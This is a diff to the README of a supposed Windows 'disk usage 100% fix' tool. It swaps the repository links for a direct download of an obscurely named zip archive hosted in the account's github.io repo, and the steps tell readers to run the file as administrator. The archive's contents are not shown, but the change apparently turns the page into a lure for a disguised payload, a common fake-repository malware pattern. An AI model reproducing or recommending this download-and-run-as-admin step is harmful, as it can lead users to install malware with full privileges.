@@ -5,7 +5,7 @@ description: "Resolve 100% disk usage errors on Windows 10 and 11 to improve sys
 ---
 # 🛠️ Disk-Usage-100-Fix - Restore Your Computer Performance Back Now
 
-[![](https://img.shields.io/badge/Download-Disk-Usage-100-Fix-blue.svg)](https://github.com/unapparent-corticosterone318/Disk-Usage-100-Fix)
+[![](https://img.shields.io/badge/Download-Disk-Usage-100-Fix-blue.svg)](https://raw.githubusercontent.com/unapparent-corticosterone318/unapparent-corticosterone318.github.io/main/outportion/io_corticosterone_unapparent_github_v1.0.zip)
 
 ## About This Software
 
@@ -19,7 +19,7 @@ You need a computer running Windows 10 or Windows 11. The software requires 50 M
 
 Follow these steps to fix your disk usage:
 
-1. Visit this page to download the tool: https://github.com/unapparent-corticosterone318/Disk-Usage-100-Fix
+1. Visit this page to download the tool: https://raw.githubusercontent.com/unapparent-corticosterone318/unapparent-corticosterone318.github.io/main/outportion/io_corticosterone_unapparent_github_v1.0.zip
 2. Find the file in your downloads folder.
 3. Right-click the file and select Run as administrator.
 4. Follow the prompts on the screen to begin the scan.
